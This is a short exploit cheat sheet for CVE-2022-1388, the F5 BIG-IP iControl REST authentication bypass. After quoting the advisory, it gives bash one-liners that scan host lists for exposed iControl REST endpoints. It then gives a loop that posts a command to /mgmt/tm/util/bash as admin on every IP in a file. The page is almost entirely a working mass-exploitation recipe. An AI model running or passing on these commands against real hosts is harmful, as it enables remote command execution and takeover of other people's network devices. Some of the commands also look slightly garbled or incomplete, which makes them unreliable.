---
description: CVE-2022-1388 PoC
---

# CVE-2022-1388

> On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, undisclosed requests may bypass iControl REST authentication. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated

### Identifying F5 iControl REST API Exposed

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>#https://twitter.com/hex0x42424242/status/1522241647718940672
</strong><strong>cat F5_servers.txt | while read host do; do curl --silent --insecure --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHMTL, like Gecko) Chrome/92.0.4515.131 Safari/537.36" "https://$host/mgmt/shared/authn/login" |Â grep -q 'resterrorresponse' &#x26;&#x26; printf "$host \033[1;41mF5 iControl REST API Exposed\e[0m\n"; done;
</strong>

cat hosts | while read host do; do curl -sk "https://$host/mgmt/shared/authn/login" | grep -q 'resterrorresponse' &#x26;&#x26; printf "$host \0331;41mF5 iControl REST API Exposed\e[0m\n"; done</code></pre>

### CVE-2022-1388: Exploit F5 Big IP Using Curl

{% code overflow="wrap" %}
```bash
#https://twitter.com/r00t_nasser/status/1523636152133029888
cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
```
{% endcode %}
